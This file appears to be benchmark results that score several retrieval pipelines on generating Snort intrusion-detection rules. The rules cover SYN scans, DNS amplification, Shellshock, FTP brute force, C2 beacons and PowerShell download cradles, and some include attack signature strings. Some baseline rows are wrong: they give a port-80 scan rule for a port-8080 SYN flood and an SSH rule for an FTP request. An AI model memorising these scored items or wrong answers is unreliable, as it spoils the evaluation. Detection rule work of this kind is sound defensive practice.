Q_007,graph_rag,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9166666666666666,0.0,SNORT_0137,SNORT_0001;SNORT_0137;SNORT_0003;SNORT_0101;SNORT_0108,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_007,agentic_rag,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0069;SNORT_0018;SNORT_0086;SNORT_0120,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
Q_008,baseline,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,1.0,SNORT_0116,,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000014; rev:1;)"
Q_008,rag_classic,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_008,rag_rerank,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_008,rag_hybrid,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_008,multi_hop,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_008,graph_rag,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0116,SNORT_0116;SNORT_0031;SNORT_0150;SNORT_0082;SNORT_0014,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000116; rev:1;)"
Q_008,agentic_rag,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_009,baseline,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.4838709677419355,1.0,SNORT_0088,,Reconnaissance,DoS_DDoS,TCP SYN Port Scan,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_009,rag_classic,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0139;SNORT_0069;SNORT_0018;SNORT_0122,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,rag_rerank,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0054;SNORT_0139;SNORT_0137;SNORT_0071,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,rag_hybrid,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0139;SNORT_0069;SNORT_0018;SNORT_0004,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,multi_hop,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0139;SNORT_0156;SNORT_0071;SNORT_0122,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,graph_rag,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0054;SNORT_0003;SNORT_0069;SNORT_0139,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,agentic_rag,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0139;SNORT_0069;SNORT_0018;SNORT_0004,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_010,baseline,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,SNORT_0035,,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,rag_classic,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0001;SNORT_0137,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,rag_rerank,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0001;SNORT_0137,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,rag_hybrid,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0020;SNORT_0018,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,multi_hop,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0001;SNORT_0137,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,graph_rag,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0052;SNORT_0069,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,agentic_rag,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0020;SNORT_0018,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_011,baseline,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0118,,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000016; rev:1;)"
Q_011,rag_classic,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0050;SNORT_0016;SNORT_0084;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,rag_rerank,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0050;SNORT_0016;SNORT_0084;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,rag_hybrid,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0084;SNORT_0050;SNORT_0016;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,multi_hop,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0084;SNORT_0050;SNORT_0067;SNORT_0016,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,graph_rag,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0084;SNORT_0050;SNORT_0101;SNORT_0016,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,agentic_rag,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0084;SNORT_0050;SNORT_0016;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_012,baseline,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.6451612903225806,1.0,SNORT_0146,,Brute_Force,Brute_Force,SSH Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000009; rev:1;)"
Q_012,rag_classic,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_012,rag_rerank,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_012,rag_hybrid,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_012,multi_hop,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0095;SNORT_0146;SNORT_0129;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000095; rev:1;)"
Q_012,graph_rag,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0112;SNORT_0061,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_012,agentic_rag,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_013,baseline,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,SNORT_0011,,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,rag_classic,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,rag_rerank,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,rag_hybrid,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,multi_hop,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,graph_rag,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0028;SNORT_0113,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,agentic_rag,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_014,baseline,Create a rule for suspicious PowerShell download cradle content.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0131,,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000012; rev:1;)"
Q_014,rag_classic,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_014,rag_rerank,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
